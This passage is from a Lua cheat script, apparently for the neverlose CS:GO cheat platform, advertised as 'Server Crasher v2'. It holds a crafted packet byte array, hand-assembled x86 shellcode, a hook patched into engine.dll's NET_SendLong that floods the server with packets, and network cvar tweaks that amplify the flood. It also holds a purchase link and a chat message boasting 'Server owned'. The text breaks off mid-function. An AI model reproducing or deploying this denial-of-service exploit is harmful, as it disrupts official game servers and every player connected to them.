	0xab,0x64,0x7e,0x2e,0xf7,0x01,0x12,0xfe,0x17,0x00,0x76,0x56,0x00,0x76,0xf6,0xc6,
	0x58,0xfe,0x33,0x77,0xc8,0x08,0xfe,0x35,0x77,0x41,0x77,0xbc,0x77,0x77,0xd9,0xf7,
	0x88,0x77,0x6e,0x77,0x6b,0x4c,0xfe,0x7f,0x77,0x81,0x77,0xf9,0xff,0x5a,0x7e,0x62,
	0xf7,0x2c,0xf7,0x6a,0x77,0x0a,0xf7,0xe6,0xf7,0x66,0xf7,0x4e,0x77,0xff,0xd7,0x77,
	0x88,0x77,0x7d,0x77,0x5f,0x77,0x01,0x77,0x32,0xf7,0x54,0xf7,0x0e,0xf7,0xed,0xf6,
	0xf7,0x1c,0x66,0x7e,0x58,0xf7,0x37,0x3b,0xfe,0xa7,0xf7,0x3a,0x77,0xff,0x21,0x77,
	0xd2,0x77,0x61,0xf7,0x92,0x77,0x36,0xf7,0x89,0x77,0x8b,0x77,0x3d,0x77,0xfb,0x07,
	0xf7,0xa1,0xf7,0x8b,0x2b,0xfe,0x21,0x77,0xbc,0xf7,0x3a,0xf7,0x38,0xf7,0xfb,0x25,
	0xf7,0x4c,0xf7,0xbd,0xdd,0x7e,0x7f,0x77,0x38,0xf7,0x0c,0x77,0x99,0x77,0xf7,0xab,
	0x77,0x42,0xf7,0x22,0x77,0x6e,0xd6,0xfe,0x67,0xf7,0x53,0xf7,0x73,0x77,0xdf,0x1c,
	0xf7,0x36,0x77,0x00,0x77,0x04,0x77,0x30,0xf7,0x5c,0x09,0x7e,0xdc,0xf7,0xff,0x50,
	0x77,0xe7,0x77,0x87,0xf7,0x2d,0xf7,0xaf,0xf7,0xd0,0x7f,0x98,0x77,0x2b,0xf7,0xbe,
	0xc3,0x4e,0x7e,0x80,0x77,0x82,0xf7,0x05,0xf7,0x6b,0xf7,0xee,0x8e,0x7e,0x57,0x40,
	0x77,0x6b,0xf7,0x46,0xf7,0x9e,0xd5,0xfe,0xef,0x04,0x7e,0x50,0xff,0x0a,0x7e,0x33,
	0x77,0x31,0x77,0x1c,0x77,0x28,0x77,0xa0,0xf7,0x12,0x77,0x1b,0xf7,0xff,0x57,0x77,
	0x06,0xf7,0xbe,0x77,0x42,0x77,0x04,0xf7,0x30,0x77,0x73,0x77,0x25,0x77,0x5d,0x00,
	0x07,0xa4,0x04,0x7e,0x5f,0xf7,0x03,0xf7,0xa3,0x6b,0x7e,0x98,0x7f,0x0c,0xfe,0x74,
	0x77,0xd4,0xf7,0x0b,0xf7,0x00,0x07,0x51,0xf7,0x2e,0xf7,0xc7,0xff,0x10,0x7e,0x74,
	0x77,0xbd,0x77,0x28,0xf7,0x35,0xf7,0x20,0xf7,0x16,0x77,0x10,0xf7,0xd5,0x9c,0xf7,
	0x5d,0x93,0xfe,0x5f,0x00,0x76,0xb9,0xf3,0x7e,0x4f,0x77,0xdf,0x71,0x77,0x2b,0xf7,
	0x2a,0xf7,0x25,0xf7,0x0f,0xf7,0x02,0x0e,0xfe,0x69,0x77,0xb6,0xb2,0x44,0xfe,0xa7,
	0x77,0xb6,0x83,0xfe,0x8d,0xf7,0xbb,0x34,0x7e,0xf7,0x22,0x77,0x68,0x77,0xdb,0xf7,
	0x51,0x66,0xfe,0xa1,0xf7,0x49,0xf7,0x54,0xf7,0x7b,0x2c,0x77,0x66,0xf7,0x1f,0x5b,
	0x7e,0x61,0xf7,0x15,0xf7,0x55,0x77,0x16,0xd7,0xfc,0x7e,0x1a,0x77,0x73,0xf7,0x83,
	0x00,0x76,0x19,0x3f,0xfe,0x7a,0x77,0xf7,0x10,0x77,0x0e,0xf7,0x63,0x77,0x2e,0x48,
	0x7e,0x5a,0x77,0x99,0xf7,0xc7,0xf7,0xbe,0xbc,0xa6,0x7e,0x74,0xf7,0x02,0x77,0x88,
	0xf7,0x4e,0xf7,0x94,0x2b,0x7e,0xff,0x5b,0x77,0x4f,0xf7,0x79,0xf7,0x51,0x77,0x56,
	0x77,0x2c,0xf7,0xfa,0xf7,0x7a,0x77,0x7f,0xa7,0xf7,0x39,0x77,0x41,0x77,0xba,0x77,
	0x57,0x77,0xed,0xf7,0x1f,0xf7,0x4b,0xff,0x65,0x7e,0x14,0xf7,0xd6,0x77,0x43,0xf7,
	0x14,0x77,0x62,0x77,0x1b,0xf7,0x7f,0x77,0xfe,0xea,0x64,0xfe,0xe5,0xf7,0xce,0x77,
	0x0c,0x77,0x6c,0x77,0xda,0x77,0x37,0x77,0xff,0x23,0xf7,0x0c,0x77,0x5f,0xf7,0x2c,
	0xf7,0x10,0xf7,0x68,0xf7,0x34,0xf7,0x67,0x77,0x7f,0x14,0xf7,0x13,0xf7,0x25,0x77,
	0x4c,0xf7,0x2f,0xf7,0x1a,0xf7,0x3d,0xf7,0x58,0xff,0xd6,0xfe,0xfc,0x77,0xe2,0x77,
	0x5d,0x77,0x42,0xf7,0xe1,0xf7,0x39,0xf7,0x5c,0x77,0x7f,0xc1,0x77,0x07,0x77,0x13,
	0xf7,0x4c,0x77,0x3a,0x77,0x09,0xf7,0x17,0xf7,0x55,0xd5,0x00,0x76,0xd2,0x00,0x76,
	0xac,0x00,0x76,0x1a,0x85,0xfe,0x62,0x77,0xfe,0xa9,0xa3,0x7e,0xb5,0x77,0x1e,0xf7,
	0x0a,0xf7,0x4d,0x77,0xcb,0xf7,0x42,0xf7,0xfe,0x35,0x8a,0xfe,0x88,0xf7,0x98,0x77,
	0x6f,0xf7,0x9a,0xf7,0x25,0xf7,0x41,0x77,0x7b,0x68,0x77,0x49,0x77,0x0a,0x15,0xfe,
	0x20,0xf7,0x16,0x77,0x0f,0xf7,0x77,0xef,0x03,0x7e,0x78,0x77,0x2d,0x77,0x9c,0x77,
	0xc5,0xd9,0xfe,0x5c,0xf7,0xaf,0x77,0xff,0x3a,0x77,0x49,0xf7,0x57,0x77,0x04,0xf7,
	0x73,0xf7,0x5a,0xf7,0x87,0x77,0xb3,0xf7,0xfb,0x0e,0xf7,0x0c,0xf7,0xa2,0x0e,0x7e,
	0xd9,0x77,0x36,0x77,0x74,0xf7,0x3d,0xf7,0xff,0x0c,0x77,0x58,0x77,0x2d,0x77,0x76,
	0xf7,0x7e,0x77,0x48,0x77,0x14,0x77,0x33,0xf7,0xfb,0x53,0xf7,0x1c,0x77,0xd4,0x09,
	0xfe,0x8d,0x77,0x4e,0xf7,0x49,0xf7,0x06,0x77,0xfe,0xae,0x57,0x7e,0x56,0x77,0x64,
	0xf7,0x5f,0x77,0x47,0xf7,0xd7,0xf7,0x6a,0x77,0xb7,0x17,0xf7,0x09,0xf7,0x5a,0xf7,
	0x45,0xc3,0x7e,0x79,0xf7,0xd7,0x3a,0xfe,0xdd,0x6c,0xf7,0xcc,0x18,0x7e,0x3f,0xf7,
	0x29,0x77,0xed,0x2d,0xfe,0x3c,0x77,0xff,0x48,0x77,0x5e,0x77,0x3e,0x77,0x57,0x77,
	0xe4,0xf7,0xa6,0x7f,0x04,0xf7,0x1a,0x77,0xfe,0x7a,0x38,0xfe,0x38,0x77,0x06,0x77,
	0x42,0x77,0xd7,0xf7,0x17,0xf7,0x50,0xf7,0xeb,0x71,0x77,0x3a,0x77,0x85,0x00,0x76,
	0x8e,0x3e,0xfe,0x45,0xf7,0x4e,0xf7,0xff,0x47,0x77,0x92,0xf7,0x51,0xf7,0xdf,0x77,
	0x04,0x77,0x2f,0x77,0xbe,0x77,0xce,0xf7,0xb7,0x64,0x77,0x25,0x77,0x74,0x77,0x66,
	0x72,0xfe,0x3b,0xf7,0xf3,0x3b,0xfe,0xfb,0xa6,0xf7,0x5f,0xf7,0x06,0x39,0x7e,0x02,
	0x7f,0x25,0x77,0x46,0xf7,0xf2,0xf7,0xff,0x6d,0xf7,0xaf,0x77,0x5a,0xf7,0x27,0x77,
	0x4a,0x77,0x18,0xf7,0x74,0xf7,0x07,0x77,0xff,0x49,0x77,0x33,0xf7,0x1a,0xf7,0x78,
	0x77,0x6c,0xf7,0xb9,0xf7,0x25,0x77,0x2a,0x77,0xbb,0x3f,0x77,0x03,0x77,0x3e,0x00,
	0xfe,0x73,0x77,0x64,0xf7,0xfb,0x59,0x7e,0xff,0x5a,0xf7,0x28,0x77,0x27,0x77,0xdf,
	0x77,0x86,0x77,0xa4,0xf7,0x22,0xf7,0x86,0x77,0xfd,0x29,0xff,0x97,0x1a,0xfe,0x33,
	0xf7,0x45,0xf7,0x13,0xf7,0x90,0x77,0x49,0x77,0xfb,0x0d,0xf7,0xc1,0xf7,0x3f,0x23,
	0x7e,0x15,0xf7,0x4c,0xf7,0x0f,0xf7,0xb1,0xf7,0xaf,0x49,0xf7,0x01,0xf7,0x45,0x77,
	0x5c,0xf7,0xdd,0x00,0x76,0xba,0x1d,0xfe,0xfd,0x26,0xf7,0x1b,0xf0,0xfe,0xe9,0xf7,
	0xc1,0xf7,0x68,0xf7,0x18,0xf7,0x5a,0x77,0xff,0xb9,0x77,0x4d,0x77,0xe4,0x77,0x38,
	0x77,0xc1,0xf7,0x4e,0xf7,0x4d,0xf7,0x48,0xf7,0xbf,0x40,0x77,0x5f,0xf7,0x1a,0xf7,
	0x87,0xf7,0x01,0x77,0xa5,0x77,0xc4,0x7f,0xfe,0xf5,0x9c,0x77,0x0f,0x00,0x76,0xe3,
	0x06,0x7e,0x28,0x77,0x86,0xf7,0xb8,0x77,0xbf,0xcb,0xf7,0x5b,0xf7,0x72,0x77,0xb1,
	0xf7,0x2a,0xf7,0xe2,0x77,0x22,0xa7,0xfe,0xad,0x3f,0x77,0x05,0x99,0x7e,0x0e,0xf7,
	0xb3,0x09,0xfe,0xfd,0x57,0xfe,0xef,0xc4,0x77,0xa4,0x77,0xfa,0x77,0xc9,0x77,0xfe,
	0x6c,0xfe,0x5d,0xf7,0x48,0xf7,0x6d,0x38,0xf7,0x67,0x28,0x7e,0x45,0x77,0xc9,0x05,
	0xfe,0x62,0xf7,0xd1,0xff,0x25,0xfe,0x0e,0x77,0x30,0xf7,0x28,0x77,0x6d,0xf7,0x0e,
	0xf7,0x7d,0x77,0x21,0xf7,0xff,0x75,0xf7,0x47,0x77,0x2d,0x77,0x93,0xf7,0x2f,0xf7,
	0x01,0xf7,0x01,0x77,0x0c,0xf7,0xaf,0x17,0xf7,0x35,0x77,0xb5,0x77,0x99,0xf7,0x63,
	0x00,0x76,0x95,0x00,0x76,0x7e,0x41,0x1d,0xfe,0xcf,0xf7,0x2d,0x77,0x13,0x77,0x98,
	0x77,0x97,0xf7,0x4f,0xf5,0xb1,0xfe,0x38,0x00,0x76,0xce,0x19,0x7e,0x3a,0x77,0x0d,
	0x77,0x60,0x77,0xff,0xe9,0x77,0x20,0x77,0x2f,0x77,0x0c,0x77,0x28,0xf7,0x0c,0xf7,
	0xd1,0x77,0x0c,0x77,0x7e,0x9c,0x58,0xfe,0xa9,0x77,0x3f,0xf7,0x63,0x77,0xb3,0xf7,
	0x22,0xf7,0x00,0xbd,0x00,0x76,0x56,0x75,0xfe,0x89,0x77,0x6f,0x77,0x32,0x77,0x54,
	0x04,0xfe,0xff,0x3f,0xf7,0x45,0xf7,0x10,0xf7,0x2b,0x77,0x0e,0x77,0x35,0xf7,0xa7,
	0x77,0xa5,0xf7,0xff,0x2c,0xf7,0x2d,0xf7,0x63,0xf7,0xc8,0xff,0x7d,0x77,0x23,0xf7,
	0x6c,0x77,0x63,0x77,0xff,0x96,0x77,0x8c,0xf7,0x60,0xf7,0x3f,0xf7,0x35,0x77,0x1a,
	0x77,0x1b,0xf7,0x29,0xf7,0xff,0x02,0xf7,0xfb,0x77,0x18,0xf7,0x40,0xf7,0x0f,0x77,
	0xd5,0xf7,0x50,0x77,0x14,0x77,0xf6,0x39,0x16,0xfe,0x99,0x77,0x0c,0x33,0xfe,0x54,
	0xf7,0x50,0x77,0x07,0x77,0x77,0x20,0x77,0x38,0xf7,0x4c,0x77,0x9d,0xce,0x7e,0x5b,
	0x77,0xa5,0xf7,0x48,0xf5,0x00,0x76,0xa7,0x00,0x76,0x44,0x41,0x7e,0x6a,0x77,0x33,
	0x77,0x89,0xf7,0xff,0x3d,0x77,0x1e,0x77,0x0b,0x77,0x25,0xf7,0x12,0xf7,0x2f,0x77,
	0x5b,0xf7,0x22,0x77,0x7b,0x01,0x77,0x5b,0x77,0x7b,0x09,0xfe,0x1d,0x77,0xd2,0xf7,
	0x0d,0xf7,0xe7,0xff,0x2c,0xfe,0x11,0x77,0x5d,0x77,0x27,0xf7,0x1e,0x77,0x54,0x77,
	0x46,0x77,0x73,0xf7,0xed,0x58,0x77,0x13,0x7e,0x7e,0xaa,0x77,0x24,0xa9,0xfe,0x82,
	0xf7,0x45,0xf7,0xaf,0x30,0x77,0x3e,0xf7,0x36,0xf7,0x67,0x77,0x28,0x21,0xfe,0x62,
	0x00,0x76,0xfe,0xf5,0x14,0x7e,0xad,0xf7,0x3d,0xf7,0x07,0xf7,0x2d,0xf7,0x69,0xf7,
	0x41,0x77,0xff,0x4e,0x77,0x2d,0xf7,0xa5,0xf7,0x4b,0xf7,0x25,0xf7,0xad,0xf7,0x62,
	0xf7,0x25,0xf7,0xfd,0xd0,0xf7,0xaa,0x27,0xfe,0x25,0x77,0x43,0xf7,0x47,0x77,0x24,
	0x77,0x4c,0x77,0xfb,0x81,0xf7,0x21,0xf7,0xd3,0x15,0xfe,0xf5,0x77,0x3a,0xf7,0xa9,
	0xf7,0x92,0x77,0xf7,0x9b,0x77,0x54,0xf7,0x18,0x77,0x86,0xea,0x7e,0x19,0x77,0xe2,
	0x77,0x9c,0x77,0xfd,0x44,0xf7,0xb7,0x90,0x7e,0x27,0xf7,0x99,0xf7,0x7d,0xf7,0x8f,
	0xf7,0x2b,0xf7,0xff,0x65,0x77,0xac,0xf7,0x4f,0xf7,0x06,0xf7,0xb3,0x77,0x87,0xf7,
	0x7f,0x77,0xc1,0xf7,0xff,0x53,0x77,0xac,0xf7,0x87,0xf7,0xcf,0x77,0x13,0xf7,0xc7,
	0xf7,0x45,0xf7,0x41,0x77,0x7f,0x4f,0x77,0x06,0x77,0xdc,0x77,0x30,0xf7,0x25,0x77,
	0x0c,0x77,0x53,0x77,0x99,0xaf,0xc9,0x7e,0x6b,0x77,0x6e,0x77,0x97,0x77,0x34,0x00,
	0x76,0x91,0xd0,0xfe,0xfd,0x35,0x77,0xc7,0x28,0xfe,0x4c,0xf7,0x36,0xf7,0x15,0xf7,
	0x11,0xf7,0xc6,0xf7,0xbf,0x07,0x77,0x64,0xf7,0x49,0x77,0x3e,0x77,0x81,0x77,0x33,
	0x77,0x7f,0x53,0xfe,0xff,0x30,0x77,0x31,0x77,0x0b,0x77,0x2e,0xf7,0x5d,0x77,0x90,
	0x77,0x3b,0x77,0xd2,0xf7,0xfb,0x27,0xf7,0x44,0x77,0x64,0x34,0x7e,0xff,0x77,0xc6,
	0xf7,0xf0,0xf7,0x03,0xf7,0xff,0x96,0x77,0xa6,0x77,0xcf,0x77,0xc4,0xf7,0x48,0x77,
	0xb8,0xf7,0x55,0x77,0x2a,0xf7,0xbf,0x7f,0x77,0x14,0xf7,0x0f,0xf7,0x23,0xf7,0x01,
	0xf7,0x3c,0x77,0x23,0x1c,0x7e,0xff,0x55,0x77,0x3c,0x77,0x4c,0xf7,0x34,0x77,0x12,
	0x77,0x6f,0xf7,0x54,0x77,0xbd,0xf7,0xd6,0xe1,0x0a,0x7e,0x1e,0x77,0x75,0x3a,0x7e,
	0x50,0x0f,0xfe,0x96,0xf7,0x7f,0x9e,0xf7,0x8a,0xf7,0xc5,0xf7,0x1f,0x77,0x46,0xf7,
	0x06,0x77,0x6a,0xf7,0xf9,0xbf,0x33,0xfe,0xd4,0x77,0x3d,0x77,0x37,0x77,0x3e,0xf7,
	0xc5,0x77,0xc2,0x00,0x76,0xd6,0x79,0xe9,0x7e,0x00,0xf7,0x7c,0x00,0x76,0x70,0x5e,
	0x7e,0x4c,0xf7,0xfb,0x22,0xf7,0x2d,0x77,0x4d,0x34,0x7e,0x06,0xf7,0x83,0xf7,0x1a,
	0xf7,0x38,0x77,0x5f,0x0f,0xf7,0xdc,0x77,0x35,0x77,0x3c,0xf7,0x15,0xf7,0x5a,0x00,
	0x76,0xbb,0xfb,0x56,0xfe,0xa0,0x77,0xdc,0x89,0xfe,0xdc,0x77,0x03,0x77,0x75,0xf7,
	0x57,0x77,0xef,0x94,0x77,0x29,0xf7,0x71,0xf7,0x85,0xf7,0x27,0x34,0xfe,0x77,0xf7,
	0x36,0xf7,0x7f,0x02,0x77,0x2c,0xf7,0x01,0xf7,0x00,0x77,0x30,0x77,0x3c,0xf7,0x48,
	0xf7,0xf1,0xff,0x17,0x7e,0xa6,0x77,0x2f,0x77,0x90,0x77,0x1e,0x77,0x0c,0x77,0x40,
	0xf7,0x17,0x77,0xff,0x74,0x77,0x7f,0x77,0x04,0xf7,0xef,0xf7,0xa1,0xf7,0xd9,0x77,
	0x62,0x77,0x58,0xf7,0xf7,0x95,0x77,0x73,0x77,0x2d,0xf7,0x76,0x11,0x7e,0x44,0x77,
	0xff,0x77,0xbc,0xf7,0xdd,0x00,0x07,0x15,0x42,0xfe,0x69,0xf7,0x52,0xf7,0xe9,0x18,
	0x7e,0x40,0x77,0xbf,0xc5,0x77,0x08,0xf7,0xee,0xf7,0x35,0x77,0x37,0x77,0x5e,0xf7,
	0xea,0x00,0x76,0xee,0x60,0x0f,0x7e,0x22,0x77,0xbd,0x77,0x25,0x20,0xfe,0x85,0xf7,
	0x3f,0xf7,0x3e,0x6d,0x14,0x7e,0x6b,0x77,0x81,0x77,0x41,0xf3,0x00,0x00
}

local packetbuf_len = #packetbuf
for i = 1, 9302, 1 do
	packetbuf[packetbuf_len + i] = 0xcd
end

---@diagnostic disable-next-line: undefined-field
local mem_packetbuf = kernel32.VirtualAlloc(nil, #packetbuf, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_READWRITE)
ffi.copy(mem_packetbuf, ffi.new("char[?]", #packetbuf, packetbuf), #packetbuf)

local Calls_SendToImpl = Utils.PatternScan("engine.dll", "55 8B EC 51 53 8B D9 56 57 8B FA 8B 03")

crasher_state[CRASHER_STATE_SHOULD_CALL] = 1
crasher_state[CRASHER_STATE_NETCHAN] = 0
crasher_state[CRASHER_STATE_SENDLONG] = ffi.cast('uintptr_t', mem_CUSTOM_NET_SendLong)
crasher_state[CRASHER_STATE_SENDTOIMPL] = ffi.cast('uintptr_t', Calls_SendToImpl)

local RunExploit = {
  0x56,                                     -- 00 push esi
  0x33, 0xF6,                               -- 01 xor esi,esi
  0xC6, 0x05, 0x7C, 0xB7, 0x0F, 0x10, 0x00, -- 03 mov byte ptr [shouldCall],00
  0x39, 0x35, 0xF4, 0xEA, 0x0F, 0x10,       -- 10 cmp [Nezu_crasher_strength],esi
  0x7E, 0x30,                               -- 16 jle end
  -- :loop
  0x80, 0x3D, 0xF2, 0xEA, 0x0F, 0x10, 0x00, -- 18 cmp byte ptr [Nezu_crasher_active],00
  0x74, 0x27,                               -- 25 je end
  0x8B, 0x15, 0x7C, 0xFC, 0x0F, 0x10,       -- 27 mov edx,[netchan]
  0x8B, 0x0D, 0x34, 0xFD, 0x0F, 0x10,       -- 33 mov ecx,[ref_Calls_SendToImpl]
  0x68, 0x40, 0x02, 0x00, 0x00,             -- 39 push 0x240
  0x6A, 0x0D,                               -- 44 push 0x0D
  0x68, 0x8C, 0xB7, 0x0F, 0x10,             -- 46 push mem_packetbuf + 0xC
  0xFF, 0x15, 0x78, 0xFC, 0x0F, 0x10,       -- 51 call dword ptr [ref_CUSTOM_NET_SendLong]
  0x46,                                     -- 57 inc esi
  0x3B, 0x35, 0xF4, 0xEA, 0x0F, 0x10,       -- 58 cmp esi,[Nezu_crasher_strength]
  0x7C, 0xD0,                               -- 64 jl loop
  -- :end
  0xC6, 0x05, 0x7C, 0xB7, 0x0F, 0x10, 0x01, -- 66 mov byte ptr [shouldCall],01
  0x33, 0xC0,                               -- 73 xor eax,eax
  0x5E,                                     -- 75 pop esi
  0xC2, 0x04, 0x00                          -- 76 ret 0004
}

setUint(RunExploit, 6,  offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))
setUint(RunExploit, 13, offsetPointer(crasher_state, CRASHER_STATE_STRENGTH))
setUint(RunExploit, 21, offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
setUint(RunExploit, 30, offsetPointer(crasher_state, CRASHER_STATE_NETCHAN))
setUint(RunExploit, 36, offsetPointer(crasher_state, CRASHER_STATE_SENDTOIMPL))
setUint(RunExploit, 48, ffi.cast("uintptr_t", mem_packetbuf) + 0xC)
setUint(RunExploit, 54, offsetPointer(crasher_state, CRASHER_STATE_SENDLONG))
setUint(RunExploit, 61, offsetPointer(crasher_state, CRASHER_STATE_STRENGTH))
setUint(RunExploit, 69, offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))

local mem_RunExploit = createShellcode(RunExploit)

local NET_SendLong = Utils.PatternScan("engine.dll", "55 8B EC 81 EC DC 04 00 00 8B 45 0C 53 8B")

crasher_state[CRASHER_STATE_COUNTER] = 0
---@diagnostic disable-next-line: undefined-field
crasher_state[CRASHER_STATE_BEGINTHREADEX] = ffi.cast('uintptr_t', ucrtbase._beginthreadex)

local Hooked_NET_SendLong = {
	0x55,                                       -- 00:0    push   ebp
	0x8b, 0xec,                                 -- 01:1    mov    ebp,esp
	0x80, 0x3d, 0xf2, 0xea, 0x0f, 0x10, 0x00,   -- 03:3    cmp    [Nezu_crasher_active],00
	0x56,                                       -- 0a:10   push   esi
	0x8b, 0xf1,                                 -- 0b:11   mov    esi,ecx
	0x57,                                       -- 0d:13   push   edi
	0x8b, 0xfa,                                 -- 0e:14   mov    edi,edx
	0x89, 0x35, 0x7c, 0xfc, 0x0f, 0x10,         -- 10:16   mov    [netchan],esi
	0x74, 0x33,                                 -- 16:22   je     0x4b
	0xa1, 0x80, 0xfc, 0x0f, 0x10,               -- 18:24   mov    eax,[counter]
	0x83, 0xf8, 0x02,                           -- 1d:29   cmp    eax,0x2
	0x7c, 0x23,                                 -- 20:32   jl     0x45
	0x80, 0x3d, 0x7c, 0xb7, 0x0f, 0x10, 0x00,   -- 22:34   cmp    [shouldCall],00
	0x74, 0x18,                                 -- 29:41   je     0x43
	0x6a, 0x00,                                 -- 2b:43   push   0x0
	0x6a, 0x00,                                 -- 2d:45   push   0x0
	0x6a, 0x00,                                 -- 2f:47   push   0x0
	0x68, 0x20, 0x9b, 0x09, 0x10,               -- 31:49   push   mem_RunExploit
	0x6a, 0x00,                                 -- 36:54   push   0x0
	0x6a, 0x00,                                 -- 38:56   push   0x0
	0xff, 0x15, 0xbc, 0xb3, 0x0b, 0x10,         -- 3a:58   call   dword ptr [ref_ucrtbase__beginthreadex]
	0x83, 0xc4, 0x18,                           -- 40:64   add    esp,0x18
	0x33, 0xc0,                                 -- 43:67   xor    eax,eax
	0x40,                                       -- 45:69   inc    eax
	0xa3, 0x80, 0xfc, 0x0f, 0x10,               -- 46:70   mov    [counter],eax
	0x8b, 0x0d, 0x34, 0xfd, 0x0f, 0x10,         -- 4b:75   mov    ecx,[ref_Calls_SendToImpl]
	0x8b, 0xd6,                                 -- 51:81   mov    edx,esi
	0x68, 0x40, 0x02, 0x00, 0x00,               -- 53:83   push   0x240
	0xff, 0x75, 0x08,                           -- 58:88   push   DWORD PTR [ebp+0x8]
	0x57,                                       -- 5b:91   push   edi
	0xff, 0x15, 0x78, 0xfc, 0x0f, 0x10,         -- 5c:92   call   dword ptr [ref_CUSTOM_NET_SendLong]
	0x5f,                                       -- 62:98   pop    edi
	0x5e,                                       -- 63:99   pop    esi
	0x5d,                                       -- 64:100  pop    ebp
	0xc2, 0x08, 0x00,                           -- 65:101  ret    0x8
}

setUint(Hooked_NET_SendLong, 6,  offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
setUint(Hooked_NET_SendLong, 19, offsetPointer(crasher_state, CRASHER_STATE_NETCHAN))
setUint(Hooked_NET_SendLong, 26, offsetPointer(crasher_state, CRASHER_STATE_COUNTER))
setUint(Hooked_NET_SendLong, 37, offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))
setUint(Hooked_NET_SendLong, 51, mem_RunExploit)
setUint(Hooked_NET_SendLong, 61, offsetPointer(crasher_state, CRASHER_STATE_BEGINTHREADEX))
setUint(Hooked_NET_SendLong, 72, offsetPointer(crasher_state, CRASHER_STATE_COUNTER))
setUint(Hooked_NET_SendLong, 78, offsetPointer(crasher_state, CRASHER_STATE_SENDTOIMPL))
setUint(Hooked_NET_SendLong, 95, offsetPointer(crasher_state, CRASHER_STATE_SENDLONG))

local mem_Hooked_NET_SendLong = createShellcode(Hooked_NET_SendLong)

local NET_SendLong_hook = {
  0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
  0xC3                          -- ret
}

setUint(NET_SendLong_hook, 2, mem_Hooked_NET_SendLong)

local NET_SendLong_orig = { 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0xDC }

--#endregion

--#region menu

local info_text = [[
This is a preview version of the updated server crasher v2.0. It can only lag. 
Buy the full version here:
https://neverlose.cc/market/item?id=BZ9BS1

Note: This script only works on official valve servers
]]

local lua_elements = {
	Menu.Text("Server Crasher v2", info_text),
	Menu.Button("Server Crasher v2", "Buy full version", "https://neverlose.cc/market/item?id=BZ9BS1", function()
		-- Panorama.Open().SteamOverlayAPI.OpenURL("https://neverlose.cc/market/item?id=BZ9BS1")
		shell32.ShellExecuteA(nil, 'open', 'https://neverlose.cc/market/item?id=BZ9BS1', nil, nil, 1)
	end),
	loopFreeze = Menu.Switch("Server lagger", "Lag the server", false),
	
	crasher_time_started_at = -1,
	last_tick_time = -1
}

--#endregion

--#region main logic

-- API vars forward declaration
local nezu_crasher_active, nezu_crasher_strength

local function updateState(new_state, strength)
	if strength ~= nil then
		if crasher_state[CRASHER_STATE_STRENGTH] ~= strength then
			crasher_state[CRASHER_STATE_STRENGTH] = strength
			pcall(function ()
				nezu_crasher_strength:SetString(tostring(strength))
			end)
		end
	end
	if new_state == crasher_state[CRASHER_STATE_ENABLED] then return end
	crasher_state[CRASHER_STATE_ENABLED] = new_state

	pcall(function ()
		nezu_crasher_active:SetString(tostring(new_state))
	end)
	if new_state == 1 then
    patch(ffi.cast("void*", NET_SendLong), NET_SendLong_hook)
		lua_elements.crasher_time_started_at = GlobalVars.realtime
  else
    patch(ffi.cast("void*", NET_SendLong), NET_SendLong_orig)
		lua_elements.crasher_time_started_at = -1
  end
end

lua_elements.loopFreeze:SetBool(false)

lua_elements.loopFreeze:RegisterCallback(function()
	local new_state = lua_elements.loopFreeze:GetBool()
	if not EngineClient:IsInGame() and new_state then
		lua_elements.loopFreeze:SetBool(false)
		new_state = false
	end
	updateState(0, 500);
end)

local iEngine = ffi.cast("void***", Utils.CreateInterface("engine.dll", "VEngineClient014")) or error('VEngineClient014 is nil.')
local iEngine_vmt = iEngine[0]
local iEngine_GetLastTimeStamp = ffi.cast(ffi.typeof("float(__thiscall*)(void*)"), iEngine_vmt[14])

local function GetLastTimestamp()
	return iEngine_GetLastTimeStamp(iEngine)
end

local last_tick_delta = 0;

local loopFreeze_time = 2.5;

Cheat.RegisterCallback("frame_stage", function(curStage)
	if curStage == 5 then -- FRAME_RENDER_START
		local active = crasher_state[CRASHER_STATE_ENABLED] == 1

		if lua_elements.loopFreeze:GetBool() and not active then
			local time_delta = GlobalVars.curtime - GetLastTimestamp()
			if time_delta < 0.1 or (last_tick_delta > 5 and time_delta < last_tick_delta) then
				EngineClient.ExecuteClientCmd("say \"Server owned by Sever Crasher v2.0 https://neverlose.cc/market/item?id=BZ9BS1\"")
				updateState(1, 550)
				active = true
			end
			last_tick_delta = time_delta;
		end

		if not EngineClient:IsInGame() then
			lua_elements.loopFreeze:SetBool(false)
			updateState(0, 500)
			active = false
		elseif active then
			local delta = GlobalVars.realtime - lua_elements.crasher_time_started_at
			if lua_elements.loopFreeze:GetBool() then
				if delta > loopFreeze_time then
					updateState(0, 500)
					active = false
				end
			end
		end

		if active then
			cvar_setInt(cvar_rate, 99999999)
			cvar_setInt(cvar_net_threaded_socket_recovery_time, 2)
			cvar_setInt(cvar_net_threaded_socket_recovery_rate, 999999)
			cvar_setInt(cvar_net_threaded_socket_burst_cap, 999999)
			cvar_setInt(cvar_net_compresspackets, 1)
			cvar_setInt(cvar_net_compresspackets_minsize, 0)
			cvar_setInt(cvar_net_maxroutable, 120)
			cvar_setFloat(cvar_net_maxroutable, 120)
			cvar_setInt(cvar_sv_maxroutable, 50)
		else
			cvar_setInt(cvar_net_maxroutable, 1200)
			cvar_setFloat(cvar_net_maxroutable, 1200)
		end
	end
end)

local function getTime(s)
	local str = ""
	if s >= 60 then
		local m = math.floor(s / 60)
		str = string.format("%dm ", m)
		s = s - (m * 60)
	end
	return string.format("%s%.1fs", str, s)
end

local function map(x, in_min, in_max, out_min, out_max) 
  return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min
end

Cheat.RegisterCallback("draw", function()

	local screen_size = EngineClient:GetScreenSize()
	local indicator_pos = Vector2.new(screen_size.x / 2, screen_size.y / 4)

	if lua_elements.crasher_time_started_at ~= -1 then

		local delta = GlobalVars.realtime - lua_elements.crasher_time_started_at

		local text = "Crasher running for: %s"
		local text_size = Render.CalcTextSize(text, 20)
		Render.Text(string.format(text, getTime(delta)), Vector2.new(indicator_pos.x - (text_size.x / 2), indicator_pos.y - 5), Color.new(1.0, 1.0, 1.0, 1.0), 20)
	end

	if EngineClient:IsInGame() then

		local time_delta = GlobalVars.curtime - GetLastTimestamp()
		if (time_delta > 0.5) then
			local text = "Time since last tick: %s"
			local text_size = Render.CalcTextSize(text, 20)

